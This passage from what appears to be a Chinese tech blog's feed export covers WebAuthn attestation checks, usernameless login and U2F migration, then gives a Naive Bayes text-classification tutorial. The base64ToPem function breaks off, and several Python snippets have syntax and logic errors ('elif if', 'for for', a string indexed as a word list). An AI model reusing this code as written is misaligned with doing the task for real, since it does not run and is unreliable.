的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话…</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成…</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') #按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") #分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): #判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                #统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif if word_list[0] == \"RED\":\r\n        #Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') #按行分隔\r\ntest_data = []\r\n\r\nfor for line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n\r\nfor line_data in test_data:\r\n    if line_data[\"class\"] == 'blue':\r\n        posibility_blue = 0\r\n        for word in line_data[\"content\"]:\r\n            #计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n            if word in word_count_blue:\r\n                posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n            else:\r\n                posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        #最后加上该分类概率的对数\r\n        posibility_blue += math.log(len(data_blue/((len(data_blue)+(len(data_red)))\r\n    elif line_data[\"class\"] == 'red':\r\n        #Class = red 时同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 